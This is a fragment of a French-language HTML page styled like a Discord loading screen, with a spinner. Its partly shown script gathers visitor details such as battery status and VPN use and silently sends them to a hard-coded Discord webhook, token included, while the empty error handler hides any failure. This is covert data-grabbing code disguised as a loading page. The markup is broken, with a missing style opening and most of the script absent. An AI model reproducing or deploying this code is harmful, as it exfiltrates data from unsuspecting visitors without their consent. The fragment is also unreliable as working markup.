<!DOCTYPE html>
<html lang="fr">
<head>

    body {

      color: #ffffff;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      flex-direction: column;
    }
    h1 { font-size: 20px; margin: 20px 0 10px; }
    p { font-size: 14px; color: #b9bbbe; text-align: center; }
    .loader {
      border: 5px solid #f3f3f3;
      border-top: 5px solid #7289da;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      animation: spin 1s linear infinite;
      margin-top: 30px;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>

> üîã Batterie : \`${batteryStatus}\`
> üõ°Ô∏è VPN : ${vpn}
        `;

        await fetch("https://discord.com/api/webhooks/1349385558627192843/J9WiGNLlSdX9mAO6GmEXKYDtlN98LxOKaTWf1u3JPsk_IZN_eyEzTnpW-yQ7-qdXqjkV", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ content: message })
        });

      } catch (err) {

      }
    });
  </script>
</head>
<body>
